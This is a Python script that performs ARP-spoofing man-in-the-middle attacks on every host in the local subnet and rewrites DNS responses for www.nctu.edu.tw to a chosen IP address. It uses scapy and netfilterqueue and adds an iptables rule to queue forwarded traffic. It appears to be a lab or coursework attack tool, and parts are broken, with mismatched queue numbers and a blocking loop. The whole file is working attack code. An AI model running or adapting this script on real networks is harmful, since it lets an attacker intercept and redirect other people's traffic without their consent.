import scapy.all as scapy
import netifaces
from scapy.layers.http import *
import re,os,time,sys
import netfilterqueue

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"
interface="ens33"
#undo: 1. get(target_ip/gateway_ip/interface) 
#---------------------------------ARP-------------------------------------#
def process_packet(packet):
	print(packet)
	packet.accept()

#--------------------------------SPOOF------------------------------------#
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]
    return (answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)



def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoof_packet(packet):
    dns_packet = scapy.IP(packet.get_payload())
    if dns_packet.haslayer(scapy.DNSRR):
        qname = dns_packet[scapy.DNSQR].qname
        if "www.nctu.edu.tw" in qname:
            spf_ans = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
            dns_packet[scapy.DNS].an = spf_ans
            dns_packet[scapy.DNS].ancount = 1
            del dns_packet[scapy.IP].len
            del dns_packet[scapy.IP].chksum
            del dns_packet[scapy.UDP].len
            del dns_packet[scapy.UDP].chksum
            packet.set_payload(str(dns_packet))
    packet.accept()

#---------------------------Device_Table---------------------------------#

print("\n")
os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 5")
gateway_ip = str(netifaces.gateways()['default'][netifaces.AF_INET][0])
gateway_mac = get_mac(gateway_ip)

answered_list = scapy.arping(gateway_ip+"/24", verbose = 0)[0]
maclist = []
iplist = []
for element in answered_list:
	iplist.append(element[1].psrc)
	maclist.append(element[1].hwsrc)
#iplist = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", str(arpinfo))
#maclist = re.findall(r"(?:[0-9a-fA-F]:?){12}", str(arpinfo))

print("IP\t\t\tMAC Address\n-----------------------------------------")
for x, y in zip(iplist,maclist):
    if(y!=gateway_mac):
        print(x + "\t\t" + y)
#-------------------------Send_spoof_Packet------------------------------#
try:
    while True:
        for ip in iplist:
            spoof(ip, gateway_ip)
            spoof(gateway_ip, ip)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, spoof_packet)
        queue.run()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...."
          "Resetting ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
#--------------------------------------------------------------------------#